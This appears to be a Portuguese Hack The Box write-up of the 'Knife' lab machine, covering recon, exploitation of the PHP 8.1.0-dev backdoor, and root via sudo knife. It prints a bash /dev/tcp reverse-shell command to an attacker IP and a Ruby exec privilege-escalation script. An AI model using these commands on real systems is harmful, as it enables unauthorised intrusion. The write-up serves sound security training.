<p><img src="/img/htb/htb-knife-logo.png" /></p>

<p><br /></p>

<table>
  <thead>
    <tr>
      <th>Nome</th>
      <th>Knife</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>IP</td>
      <td>10.10.10.242</td>
    </tr>
    <tr>
      <td>Pontos</td>
      <td>20</td>
    </tr>
    <tr>
      <td>OS</td>
      <td>Linux</td>
    </tr>
    <tr>
      <td>Nível</td>
      <td>Easy</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h2 id="recon">RECON</h2>

<h3 id="nmap">Nmap</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-sCV</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-O</span> 10.10.10.242 <span class="nt">--min-rate</span><span class="o">=</span>512 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Emergent Medical Idea

</code></pre></div></div>
<p>Encontramos somente as portas 22 e 80 abertas. Vamos começar pela porta 80.</p>

<h3 id="porta-80">Porta 80</h3>

<p><img src="/img/htb/htb-knife-1.png" /></p>

<p>Apenas uma página simples sem links para seguir.</p>

<p>A varredura com gobuster também não trouxe nada relevante.</p>

<p>Vamos tentar o whatweb para obter mais informações.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~]
└─<span class="nv">$ </span>whatweb http://10.10.10.242/
http://10.10.10.242/ <span class="o">[</span>200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
</code></pre></div></div>

<p>Conseguimos identificar que o server roda em PHP na versão “PHP/8.1.0-dev”, vamos procurar algum exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~]
└─<span class="nv">$ </span>searchsploit <span class="s2">"PHP 8.1.0-dev"</span> 
PHP 8.1.0-dev - <span class="s1">'User-Agentt'</span> Remote Code Execution                       | php/webapps/49933.py
</code></pre></div></div>
<p>Esta versão do PHP possui uma vulnerabilidade que permite execução de código remoto via manipulação do user-agent.</p>

<p>Vamos copiar o exploit para nosso diretório e nomeá-lo como “exploit.py” para testá-lo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/knife]
└─<span class="nv">$ </span>python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can<span class="s1">'t acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ ls -la
total 84
drwxr-xr-x  20 root root  4096 May 18 13:25 .
drwxr-xr-x  20 root root  4096 May 18 13:25 ..
lrwxrwxrwx   1 root root     7 Feb  1  2021 bin -&gt; usr/bin
drwxr-xr-x   4 root root  4096 Jul 23 13:37 boot
drwxr-xr-x   2 root root  4096 May  6 14:10 cdrom
drwxr-xr-x  19 root root  4020 Sep  3 04:33 dev
drwxr-xr-x  99 root root  4096 May 18 13:25 etc
drwxr-xr-x   3 root root  4096 May  6 14:44 home
lrwxrwxrwx   1 root root     7 Feb  1  2021 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Feb  1  2021 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Feb  1  2021 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Feb  1  2021 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 May  6 14:08 lost+found
drwxr-xr-x   2 root root  4096 May 18 13:20 media
drwxr-xr-x   2 root root  4096 May 18 13:20 mnt
drwxr-xr-x   5 root root  4096 May 18 13:20 opt
dr-xr-xr-x 358 root root     0 Sep  3 04:32 proc
drwx------   7 root root  4096 May 18 13:26 root
drwxr-xr-x  27 root root   820 Sep  3 16:47 run
lrwxrwxrwx   1 root root     8 Feb  1  2021 sbin -&gt; usr/sbin
drwxr-xr-x   6 root root  4096 May 18 13:20 snap
drwxr-xr-x   2 root root  4096 Feb  1  2021 srv
dr-xr-xr-x  13 root root     0 Sep  3 04:32 sys
drwxrwxrwt  16 root root 12288 Sep  4 00:00 tmp
drwxr-xr-x  15 root root  4096 May 18 13:20 usr
drwxr-xr-x  14 root root  4096 May  9 04:22 var


</span></code></pre></div></div>

<p>Ao executarmos o exploit, temos uma versão bem resumida de RCE em forma de bash.</p>

<p>Para podermos explorar de forma efetiva, precisamos de um tty shell, vamos iniciar um netcat ouvindo a conexão reversa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/knife]
└─<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 8443
listening on <span class="o">[</span>any] 8443 ...
</code></pre></div></div>

<p>Agora vamos enviar um payload no terminal do RCE.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/knife]
└─<span class="nv">$ </span>python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can<span class="s1">'t acces tty; job crontol turned off.
$ /bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.130/8443 0&gt;&amp;1"
</span></code></pre></div></div>

<p>Checando no netcat, conseguimos um shell.</p>

<p><img src="/img/htb/htb-knife-2.png" /></p>

<p>E dentro do diretório do usuário “james”, conseguimos flag do usuário.</p>

<p><img src="/img/htb/htb-knife-3.png" />
<br /></p>
<h2 id="escalação-de-privilégios">ESCALAÇÃO DE PRIVILÉGIOS</h2>

<p>Já dentro do server, vamos fazer a enumeração local, com o comando <code class="language-plaintext highlighter-rouge">sudo -l</code>, encontramos algo interessante:</p>

<p><img src="/img/htb/htb-knife-4.png" /></p>

<p>O usuário tem permissão de executar <code class="language-plaintext highlighter-rouge">/usr/bin/knife</code> com privilégios de administrador sem uso de senha, vamos enumerar este binário.</p>

<p><img src="/img/htb/htb-knife-5.png" /></p>

<p>Quando enumeramos o diretório real do binário, podemos ver que se trata de um diretório de instalação do ruby.</p>

<p><img src="/img/htb/htb-knife-6.png" /></p>

<p>Ao tentar executar o programa, ele nos retora uma grande lista de opções de argumento, entre elas uma bem interessante:</p>

<p><img src="/img/htb/htb-knife-7.png" /></p>

<p>Isso significa que podemos executar scripts em ruby, vamos voltar para o diretorio do usuário james e criar um script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">pwd                                   
pwd</span>
/home/james
james@knife:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'exec "/bin/bash -i"'</span> <span class="o">&gt;</span> hastur.rb
</code></pre></div></div>
<p>Ao executar <code class="language-plaintext highlighter-rouge">sudo /usr/bub/knife exec hastur.rb</code> temos nosso shell com root e podemos enumerar a flag.</p>

<p><img src="/img/htb/htb-knife-8.png" /></p>

<p>E comprometemos o server!!
<br /></p>

<p><img src="/img/htb/hackerman.gif" />
<br /></p>
<h3 id="referências">Referências</h3>

<table>
  <thead>
    <tr>
      <th>Vulnerabilidade</th>
      <th>Url</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>PHP 8.1.0-dev development version backdoor</td>
      <td><a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce">https://github.com/flast101/php-8.1.0-dev-backdoor-rce</a></td>
    </tr>
  </tbody>
</table>

